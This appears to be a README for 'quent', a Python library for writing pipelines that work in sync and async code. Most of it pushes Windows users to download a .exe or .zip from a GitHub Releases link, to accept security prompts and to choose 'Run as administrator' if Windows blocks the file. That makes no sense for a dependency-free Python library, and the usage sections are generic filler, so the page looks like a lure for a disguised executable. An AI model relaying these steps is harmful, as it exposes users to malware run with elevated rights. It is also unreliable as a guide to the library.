# 🚀 quent - Write Python pipelines with ease

[⬇️ Download quent from GitHub Releases](https://github.com/Chal8084/quent/releases)

## 🧩 What quent does

quent helps you write pipeline code once and use it in sync or async code. It keeps the same flow in both cases, so you do not need two separate versions of the same logic.

It is built in pure Python and uses no extra dependencies. That keeps setup simple and makes it easy to move between projects.

## 💻 What you need

- Windows 10 or Windows 11
- A recent version of Python 3
- Internet access to get the download
- Enough space for a small app or source package

If you plan to run it from source, install Python first. If you plan to use a packaged release, you can just download the release file and follow the steps below.

## 📥 Download and install

1. Open the [quent Releases page](https://github.com/Chal8084/quent/releases)
2. Find the latest release at the top of the page
3. Look for a Windows file such as:
   - a `.exe` file
   - a `.zip` file
   - a source archive if that is the only option
4. Download the file to your computer
5. If you downloaded a `.zip` file, right-click it and choose **Extract All**
6. Open the extracted folder
7. If you see an `.exe` file, double-click it to run the app
8. If you see Python files, use the steps in the next section

## ▶️ Run from source on Windows

Use this path if the release gives you Python files instead of a ready-to-run app.

1. Install Python 3 from the official Python website
2. Download the quent release from the [Releases page](https://github.com/Chal8084/quent/releases)
3. Extract the files if needed
4. Open the folder that contains the project files
5. Hold **Shift** and right-click inside the folder
6. Choose **Open PowerShell window here** or **Open in Terminal**
7. Run the app with Python using the file name from the release package

Example pattern:

- `python main.py`
- or `python quent.py`

If the package includes a different file name, use that file instead.

## 🪟 First run on Windows

When you start quent for the first time:

1. If Windows shows a security prompt, choose the option that lets you run the file
2. If a command window opens, keep it open while the app runs
3. If the app has a window, use it like any other desktop app
4. If the app runs from the terminal, type the required input when asked

If you downloaded a ZIP file, keep the extracted folder in place so the app can find its files.

## 🔄 How quent fits your work

quent is useful when you want one pipeline flow that works in both sync and async code.

Common use cases:

- simple data steps
- task chains
- request handling
- file processing
- tools that need the same logic in two run modes

A pipeline lets each step pass its result to the next step. With quent, you write that flow once and let the runtime handle the sync or async path.

## 🧠 Basic idea

Think of a pipeline as a line of steps:

1. Take input
2. Process it
3. Pass the result forward
4. Finish with output

quent keeps this pattern clear. That helps when you want code that is easy to read and easy to change.

## 🛠️ Typical setup pattern

A common setup looks like this:

- create a pipeline
- add steps in order
- call it from sync code
- call it from async code

The same pipeline can work in both cases, which reduces duplicate code and keeps your project simpler.

## 📁 File types you may see

When you open the release, you may see one of these:

- `.exe` — double-click to run
- `.zip` — extract first, then run
- `.py` — run with Python
- source folder — open in Terminal and use Python to start it

If you are not sure which file to use, start with the main `.exe` if it exists. If not, use the Python file in the main folder.

## ⚙️ Troubleshooting

### 🔹 The file does not open

- Check that the download finished
- Make sure you extracted the ZIP file
- Try running the file again
- Right-click the file and choose **Run as administrator** if Windows blocks it

### 🔹 Python is not recognized

- Install Python 3
- During install, turn on the option to add Python to PATH
- Close Terminal and open it again
- Run the command again

### 🔹 Windows asks what app to use

- Pick Python for `.py` files
- Pick the downloaded app for `.exe` files

### 🔹 The terminal closes right away

- Start the app from PowerShell or Command Prompt
- Read the error message before closing the window
- Check that you used the correct file name

## 🧪 Example workflow

If you want to test quent on Windows:

1. Visit the [quent Releases page](https://github.com/Chal8084/quent/releases)
2. Download the latest Windows package
3. Extract it if needed
4. Start the app or run the Python file
5. Follow the prompt or use the provided pipeline file

## 🔐 Safety check before you run

- Download only from the GitHub Releases page
- Check that the file name matches the latest release
- If Windows shows a warning, verify that you opened the correct file from the release folder

## 📌 Quick start checklist

- Open the [Releases page](https://github.com/Chal8084/quent/releases)
- Download the latest Windows file
- Extract the ZIP file if needed
- Run the `.exe` file or start the Python file
- Keep the terminal open if the app uses one